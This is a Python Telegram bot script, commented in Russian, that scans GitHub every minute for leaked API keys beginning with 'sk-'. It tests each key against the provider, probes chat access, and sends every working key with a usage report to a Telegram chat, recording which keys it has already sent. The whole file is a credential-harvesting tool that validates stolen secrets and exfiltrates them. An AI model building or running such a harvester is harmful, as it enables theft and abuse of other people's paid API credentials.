import os
import json
import asyncio
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

from github_key_parser import (
    run_scan, collect_keys, check_key, probe_chat, 
    format_report, append_history, DEFAULT_ENDPOINT
)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
RUN_DURATION_SECONDS = int(os.getenv("RUN_DURATION_SECONDS", 5 * 3600 + 50 * 60))
SCAN_INTERVAL_SECONDS = 60  # Минимальный безопасный интервал (1 минута)

STATE_FILE = "state.json"
sent_keys = set()

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def load_state():
    global sent_keys
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                sent_keys = set(json.load(f))
            logger.info(f"Загружено {len(sent_keys)} старых ключей из кэша.")
        except Exception as e:
            logger.error(f"Ошибка чтения state: {e}")

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(list(sent_keys), f)
    except Exception as e:
        logger.error(f"Ошибка сохранения state: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡️ Бот запущен. Авто-рассылка только РАБОЧИХ ключей.")

async def auto_scan_loop(app):
    if not CHAT_ID:
        logger.warning("CHAT_ID не задан!")
        return

    await asyncio.sleep(10)
    loop = asyncio.get_event_loop()

    while True:
        logger.info("Фоновое сканирование...")
        try:
            found = await loop.run_in_executor(None, lambda: collect_keys("sk- language:Python OR language:JavaScript", max_files=15))
            
            for key, meta in found.items():
                if key in sent_keys:
                    continue
                
                chk = await loop.run_in_executor(None, lambda: check_key(key))
                
                # Отправляем ТОЛЬКО если ключ реально работает (200 OK)
                if chk.get("ok"):
                    prb = await loop.run_in_executor(None, lambda: probe_chat(key))
                    report = format_report(DEFAULT_ENDPOINT, key, meta["provider"], chk, prb, chk.get("models"))
                    
                    await app.bot.send_message(chat_id=CHAT_ID, text=report)
                    sent_keys.add(key)
                    save_state()
                    
                    append_history({"key": key, "provider": meta["provider"], "working": True})
                    logger.info(f"Отправлен рабочий ключ: {key[:10]}...")
                    
        except Exception as e:
            logger.error(f"Ошибка: {e}")

        await asyncio.sleep(SCAN_INTERVAL_SECONDS)

async def run_bot_for_a_while(duration_seconds: int):
    load_state()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    asyncio.create_task(auto_scan_loop(app))

    logger.info(f"Бот запущен на {duration_seconds} сек")
    try:
        await asyncio.sleep(duration_seconds)
    finally:
        logger.info("Останавливаю бота...")
        save_state()
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(run_bot_for_a_while(RUN_DURATION_SECONDS))
    except (KeyboardInterrupt, SystemExit):
        save_state()
